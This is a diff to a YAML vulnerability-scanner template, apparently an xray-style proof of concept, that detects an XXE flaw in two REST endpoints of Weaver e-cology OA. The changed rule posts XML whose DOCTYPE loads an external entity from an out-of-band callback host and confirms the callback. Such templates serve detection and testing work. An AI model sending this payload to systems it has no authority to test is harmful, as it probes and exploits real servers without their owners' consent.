@@ -16,33 +16,26 @@ info:
     - https://mp.weixin.qq.com/s/nqGZL2Ny6m9wrNqlWqu4-Q
     - https://mp.weixin.qq.com/s/6p7-R5_VOeDUUobMuqYGcA
     - https://stack.chaitin.com/tool/detail?id=1036
-  tags: ecology,oa,xxe
+  tags: weaver,ecology,oa,xxe
   created: 2023/07/12
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - /rest/ofs/deleteUserRequestInfoByXml
+        - /rest/ofs/ReceiveCCRequestByXml
     request:
       method: POST
-      path: /rest/ofs/deleteUserRequestInfoByXml
+      path: "{{p}}"
       headers:
         Content-Type: application/xml
       body: |
         <?xml version="1.0" encoding="utf-8"?>
-        <!DOCTYPE syscode SYSTEM "{{oobHTTP}}">
+        <!DOCTYPE syscode SYSTEM "{{oob.HTTP}}">
         <M><syscode>&send;</syscode></M>
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
-  r1:
-    request:
-      method: POST
-      path: /rest/ofs/ReceiveCCRequestByXml
-      headers:
-        Content-Type: application/xml
-      body: |
-        <?xml version="1.0" encoding="utf-8"?>
-        <!DOCTYPE syscode SYSTEM "{{oobHTTP}}">
-        <M><syscode>&send;</syscode></M>
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
-expression: r0() || r1()
+    expression: oobCheck(oob.ProtocolHTTP, 3)
+expression: r0()
